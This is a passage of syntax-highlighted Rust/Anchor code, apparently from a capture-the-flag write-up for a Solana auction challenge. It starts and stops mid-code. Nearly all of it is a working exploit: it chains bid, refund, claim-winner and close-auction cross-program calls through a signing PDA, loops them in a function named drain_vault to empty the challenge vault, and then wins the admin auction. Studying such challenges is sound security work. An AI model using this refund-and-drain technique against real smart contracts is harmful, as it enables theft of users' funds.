            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_player<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_bid_exploit <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>
            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        signer<span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_exploit<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_refund_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ClaimRefund</span> <span class="token punctuation">&#123;</span>
            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_refund</span><span class="token punctuation">(</span>cpi_refund_player<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_winner <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ClaimWinner</span> <span class="token punctuation">&#123;</span>
            winner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        signer<span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_winner</span><span class="token punctuation">(</span>cpi_winner<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_close <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">CloseAuction</span> <span class="token punctuation">&#123;</span>
            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">close_auction</span><span class="token punctuation">(</span>cpi_close<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[inline(never)]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">drain_vault</span><span class="token punctuation">(</span>
    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">,</span>
    bump<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span>
    rounds<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
    starting_bid<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
    buy_now<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> exploit_seeds <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token string">b"exploit"</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span>bump<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> signer <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token operator">&amp;</span>exploit_seeds<span class="token punctuation">[</span><span class="token punctuation">..</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token number">0</span><span class="token punctuation">..</span>rounds <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token punctuation">(</span>end_time<span class="token punctuation">,</span> settlement_deadline<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> cpi_create <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">CreateAuction</span> <span class="token punctuation">&#123;</span>
                auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">create_auction</span><span class="token punctuation">(</span>
            cpi_create<span class="token punctuation">,</span>
            <span class="token number">999</span><span class="token punctuation">,</span>
            <span class="token string">"drain"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            buy_now<span class="token punctuation">,</span>
            starting_bid<span class="token punctuation">,</span>
            <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">,</span>
            end_time<span class="token punctuation">,</span>
            settlement_deadline<span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> cpi_bid_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>
                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_player<span class="token punctuation">,</span> starting_bid<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> cpi_bid_exploit <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new_with_signer</span><span class="token punctuation">(</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>
                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_pda<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>exploit_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            signer<span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_exploit<span class="token punctuation">,</span> buy_now<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> cpi_refund_player <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">ClaimRefund</span> <span class="token punctuation">&#123;</span>
                bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_refund</span><span class="token punctuation">(</span>cpi_refund_player<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

        <span class="token keyword">let</span> cpi_close <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
            ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token class-name">CloseAuction</span> <span class="token punctuation">&#123;</span>
                auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>my_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">close_auction</span><span class="token punctuation">(</span>cpi_close<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[inline(never)]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">win_admin_auction</span><span class="token punctuation">(</span>ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Context</span><span class="token operator">&lt;</span><span class="token class-name">Solve</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> cpi_bid_final <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">PlaceBid</span> <span class="token punctuation">&#123;</span>
            bidder<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">place_bid</span><span class="token punctuation">(</span>cpi_bid_final<span class="token punctuation">,</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token constant">LAMPORTS_PER_SOL</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> cpi_winner <span class="token operator">=</span> <span class="token class-name">CpiContext</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>
        ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>challenge_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">ClaimWinner</span> <span class="token punctuation">&#123;</span>
            winner<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>player<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auction<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_auction<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            bidder_state<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin_bidder_state<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            auctioneer<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>admin<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            vault<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>vault<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            system_program<span class="token punctuation">:</span> ctx<span class="token punctuation">.</span>accounts<span class="token punctuation">.</span>system_program<span class="token punctuation">.</span><span class="token function">to_account_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token namespace">challenge<span class="token punctuation">::</span>cpi<span class="token punctuation">::</span></span><span class="token function">claim_winner</span><span class="token punctuation">(</span>cpi_winner<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[inline(never)]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">auction_times</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">i64</span><span class="token punctuation">,</span> <span class="token keyword">i64</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token class-name">Clock</span><span class="token punctuation">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">.</span>unix_timestamp<span class="token punctuation">;</span>
    <span class="token keyword">let</span> end_time <span class="token operator">=</span> now <span class="token operator">+</span> <span class="token number">1000</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> settlement_deadline <span class="token operator">=</span> end_time <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span>end_time<span class="token punctuation">,</span> settlement_deadline<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[derive(Accounts)]</span>
<span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Solve</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/// CHECK: program</span>
    <span class="token keyword">pub</span> challenge_program<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span> 
    <span class="token comment">/// CHECK: auction</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> admin_auction<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: bidder_state</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> admin_bidder_state<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token keyword">pub</span> system_program<span class="token punctuation">:</span> <span class="token class-name">Program</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token comment">/// CHECK: vault (system account)</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
    <span class="token keyword">pub</span> vault<span class="token punctuation">:</span> <span class="token class-name">AccountInfo</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'info</span><span class="token operator">></span><span class="token punctuation">,</span>
    <span class="token attribute attr-name">#[account(mut)]</span>
